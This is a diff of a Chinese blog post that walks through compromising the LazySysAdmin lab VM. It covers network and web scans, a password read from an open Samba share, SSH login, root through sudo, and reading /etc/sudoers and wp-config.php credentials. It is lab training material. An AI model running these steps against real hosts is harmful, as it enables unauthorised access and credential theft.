@@ -130,7 +130,7 @@
 <p>攻击机：Kali（IP：192.168.199.133）</p>
 <p>靶机：LazySysAdmin（IP：192.168.199.136）</p>
 <h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><code>Netdiscover</code>扫描网段，发现靶机IP地址</p>
-<pre><code>netdiscover -r 192.168.199.0/24
+<pre><code class="bash">netdiscover -r 192.168.199.0/24
 
 Currently scanning: Finished!   |   Screen View: Unique Hosts
 
@@ -141,8 +141,9 @@ Currently scanning: Finished!   |   Screen View: Unique Hosts
  192.168.199.1   d4:ee:07:3c:d0:6c      4     240  HIWIFI Co., Ltd.
  192.168.199.136 00:0c:29:a6:c9:06      1      60  VMware, Inc.
  ...
-</code></pre><p><code>nmap</code>扫描</p>
-<pre><code>root@Knlvre:~# nmap -A 192.168.199.136
+</code></pre>
+<p><code>nmap</code>扫描</p>
+<pre><code class="bash">root@Knlvre:~# nmap -A 192.168.199.136
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-08 20:48 CST
 Nmap scan report for LazySysAdmin.lan (192.168.199.136)
 Host is up (0.00085s latency).
@@ -174,7 +175,8 @@ PORT     STATE SERVICE     VERSION
 |   source ident: nmap
 |   source host: 192.168.199.133
 |_  error: Closing link: (nmap@192.168.199.133) [Client exited]
-</code></pre><p>从扫描结果可以看到，除了常见的<code>ssh</code>和<code>web</code>端口外，还有<code>Samba</code>、<code>Mysql</code>、<code>InspIRCd</code>，这里介绍一下</p>
+</code></pre>
+<p>从扫描结果可以看到，除了常见的<code>ssh</code>和<code>web</code>端口外，还有<code>Samba</code>、<code>Mysql</code>、<code>InspIRCd</code>，这里介绍一下</p>
 <blockquote>
 <p><strong>InspIRCd</strong>，是一个UNIX系统和Windows系统的聊天服务器</p>
 <p><strong>Samba</strong>，是种用来让UNIX系列的操作系统与微软Windows操作系统的SMB/CIFS（Server Message Block/Common Internet File System）网络协议做链接的自由软件。第三版不仅可访问及分享SMB的文件夹及打印机，本身还可以集成入Windows Server的网域，扮演为网域控制站（Domain Controller）以及加入Active Directory成员。简而言之，此软件在Windows与UNIX系列操作系统之间搭起一座桥梁，让两者的资源可互通有无</p>
@@ -182,8 +184,9 @@ PORT     STATE SERVICE     VERSION
 <p>当然了，既然<code>80</code>端口开放，先浏览器访问，一个普通的界面并且没有可以利用的信息</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/LSA1.png" alt="1"></p>
 <p>貌似没有可利用信息，用kali自带的<code>DirBuster</code>扫一下目录。使用如下命令打开</p>
-<pre><code>dirbuster -u http://192.168.199.136
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/LSA7.png" alt="7"></p>
+<pre><code class="bash">dirbuster -u http://192.168.199.136
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/LSA7.png" alt="7"></p>
 <p>可以看到<code>Target URL</code>已经帮我们填好，因为在命令行输入了。现在点击<code>Browse</code>，添加扫描目录使用的字典，添加字典<code>/usr/share/dirbuster/wordlists/directory-list-1.0.txt</code>，然后点击<code>Start</code>开始扫描</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/LSA8.png" alt="8"></p>
 <p>不一会就扫描出了<code>wordpress</code>和<code>phpmyadmin</code>目录</p>
@@ -193,14 +196,15 @@ PORT     STATE SERVICE     VERSION
 <p>②<code>AWVS11</code>：单单扫描目录结果并不完整，选择<code>full scan</code>可以扫出一部分目录，但是等全部完成又需要较长时间，我没有等下去，对于本靶机只扫目录的话，比较慢</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/LSA2.png" alt="2"></p>
 <p>③<code>长亭Xray</code>：不知道是不是我姿势不对，扫描得并不完整</p>
-<pre><code>xray_windows_amd64.exe webscan --basic-crawler http://192.168.199.136 --html-output 2.html
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/LSA5.png" alt="5"></p>
+<pre><code class="bash">xray_windows_amd64.exe webscan --basic-crawler http://192.168.199.136 --html-output 2.html
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/LSA5.png" alt="5"></p>
 <p>回归正题，接下来访问<code>phpmyadmin</code></p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/LSA4.png" alt="4"></p>
 <p>用<code>test404</code>大佬写的工具爆破没有结果</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/LSA3.png" alt="3"></p>
 <p>转头去访问<code>wordpress目录</code>，是可以访问的，<code>wpscan</code>扫描一下。但是只扫出一个<code>admin</code>用户，无利用点</p>
-<pre><code>root@Knlvre:~# wpscan --url http://192.168.199.136/wordpress/ --enumerate u
+<pre><code class="bash">root@Knlvre:~# wpscan --url http://192.168.199.136/wordpress/ --enumerate u
 ...
 [+] Enumerating Users (via Passive and Aggressive Methods)
  Brute Forcing Author IDs - Time: 00:00:00 &lt;========&gt; (10 / 10) 100.00% Time: 00:00:00
@@ -219,16 +223,20 @@ PORT     STATE SERVICE     VERSION
  | Confirmed By: Login Error Messages (Aggressive Detection)
 
 [+] Finished: Wed Oct  9 10:57:41 2019
-</code></pre><p><strong>InsplRCd</strong></p>
+</code></pre>
+<p><strong>InsplRCd</strong></p>
 <p>参考文章：<a href="https://www.howtoing.com/how-to-set-up-an-irc-server-on-ubuntu-14-04-with-inspircd-2-0-and-shalture" target="_blank" rel="noopener">IRC</a></p>
 <p>用工具<code>irssi</code>连接靶机的<code>InsplRCd</code>服务。先下载irssi</p>
-<pre><code>sudo apt-get install irssi
-</code></pre><p>然后启动irssi客户端</p>
-<pre><code>irssi
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/LSA9.png" alt="9"></p>
+<pre><code class="code">sudo apt-get install irssi
+</code></pre>
+<p>然后启动irssi客户端</p>
+<pre><code class="code">irssi
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/LSA9.png" alt="9"></p>
 <p>然后输入如下命令连接，连接成功，但是没有可利用信息，放弃</p>
-<pre><code>/connect 192.168.199.136
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/LSA10.png" alt="10"></p>
+<pre><code class="code">/connect 192.168.199.136
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/LSA10.png" alt="10"></p>
 <p><strong>Sanba</strong></p>
 <p>简单介绍一款工具：enum4linux</p>
 <blockquote>
@@ -267,17 +275,19 @@ Reconnecting with SMB1 for workgroup listing.
 <p>直接发现是网站的源代码</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/LSA14.png" alt="14"></p>
 <p>查看其他文件没有可用信息，但是当看到<code>deets.txt</code>时，发现了<code>password</code>字样</p>
-<pre><code>root@Knlvre:/run/user/0/gvfs/smb-share:server=192.168.199.136,share=share$# cat deets.txt 
+<pre><code class="bash">root@Knlvre:/run/user/0/gvfs/smb-share:server=192.168.199.136,share=share$# cat deets.txt 
 CBF Remembering all these passwords.
 
 Remember to remove this file and update your password after we push out the server.
 
 Password 12345
-</code></pre><p>想到刚才<code>wpscan</code>扫出来的<code>admin</code>，用这个密码去<code>wordpress</code>的后台登录界面登录试一下。登陆失败，后来又想到主界面一直重复出现的提示<code>My name is togie.</code>，用<code>togie</code>用户名去登录，也是失败</p>
-<pre><code>http://192.168.199.136/wordpress/wp-login.php
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/LSA15.png" alt="15"></p>
+</code></pre>
+<p>想到刚才<code>wpscan</code>扫出来的<code>admin</code>，用这个密码去<code>wordpress</code>的后台登录界面登录试一下。登陆失败，后来又想到主界面一直重复出现的提示<code>My name is togie.</code>，用<code>togie</code>用户名去登录，也是失败</p>
+<pre><code class="url">http://192.168.199.136/wordpress/wp-login.php
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/LSA15.png" alt="15"></p>
 <p>又想到开放22端口，继续去尝试一下。用<code>用户名：togie，密码：12345</code>登录成功</p>
-<pre><code>root@Knlvre:~# ssh togie@192.168.199.136
+<pre><code class="bash">root@Knlvre:~# ssh togie@192.168.199.136
 ##################################################################################################
 #                                          Welcome to Web_TR1                                    #
 #                             All connections are monitored and recorded                         # 
@@ -290,17 +300,20 @@ Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)
 togie@LazySysAdmin:~$ whoami
 togie
 togie@LazySysAdmin:~$
-</code></pre><p>发现该用户属于<code>sudo组</code></p>
-<pre><code>togie@LazySysAdmin:~$ id
+</code></pre>
+<p>发现该用户属于<code>sudo组</code></p>
+<pre><code class="bash">togie@LazySysAdmin:~$ id
 uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
-</code></pre><p>现在尝试命令<code>sudo su</code>，直接提权成功</p>
-<pre><code>togie@LazySysAdmin:~$ sudo su
+</code></pre>
+<p>现在尝试命令<code>sudo su</code>，直接提权成功</p>
+<pre><code class="bash">togie@LazySysAdmin:~$ sudo su
 [sudo] password for togie: 
 
 root@LazySysAdmin:/home/togie# id
 uid=0(root) gid=0(root) groups=0(root)
-</code></pre><p>然后现在用<code>root</code>用户查看<code>/etc/sudoers</code>文件，果然是默认地赋予了<code>sudu组</code>权限，才能提权</p>
-<pre><code>root@LazySysAdmin:/home/togie# cat /etc/sudoers
+</code></pre>
+<p>然后现在用<code>root</code>用户查看<code>/etc/sudoers</code>文件，果然是默认地赋予了<code>sudu组</code>权限，才能提权</p>
+<pre><code class="bash">root@LazySysAdmin:/home/togie# cat /etc/sudoers
 ...
 # User privilege specification
 root    ALL=(ALL:ALL) ALL
@@ -313,8 +326,9 @@ root    ALL=(ALL:ALL) ALL
 
 ...
 root@LazySysAdmin:/home/togie# 
-</code></pre><p>拿下flag</p>
-<pre><code>root@LazySysAdmin:/home/togie# cd ~
+</code></pre>
+<p>拿下flag</p>
+<pre><code class="bash">root@LazySysAdmin:/home/togie# cd ~
 root@LazySysAdmin:~# ls
 proof.txt
 root@LazySysAdmin:~# cat proof.txt 
@@ -336,9 +350,10 @@ WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ#PT9851
 2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7
 pf%&amp;1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02
 bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu
-</code></pre><p><strong>另一种思路</strong></p>
+</code></pre>
+<p><strong>另一种思路</strong></p>
 <p>本靶机还有另外一种解法，就是拿到<code>share$</code>文件后，进入<code>wordpress</code>目录，查看<code>wp-config.php</code>，在该配置文件里会看到数据库的账号和密码（密码那么复杂难怪没有爆破出来）</p>
-<pre><code>root@Knlvre:/run/user/0/gvfs/smb-share:server=192.168.199.136,share=share$/wordpress# cat wp-config.php
+<pre><code class="bash">root@Knlvre:/run/user/0/gvfs/smb-share:server=192.168.199.136,share=share$/wordpress# cat wp-config.php
 ...
 // ** MySQL settings - You can get this info from your web host ** //
 /** The name of the database for WordPress */
@@ -359,7 +374,8 @@ define(&#39;DB_CHARSET&#39;, &#39;utf8&#39;);
 /** The Database Collate type. Don&#39;t change this if in doubt. */
 define(&#39;DB_COLLATE&#39;, &#39;&#39;);
 ...
-</code></pre><p>拿去<code>phpmyadmin</code>登录，虽然登陆进去但是没有任何权限</p>
+</code></pre>
+<p>拿去<code>phpmyadmin</code>登录，虽然登陆进去但是没有任何权限</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/LSA16.png" alt="16"></p>
 <p>于是去wordpress后台登录，也是可以登录进来的。点击<code>Appearance -&gt; Editor -&gt; 404 Template</code></p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/LSA17.png" alt="17"></p>
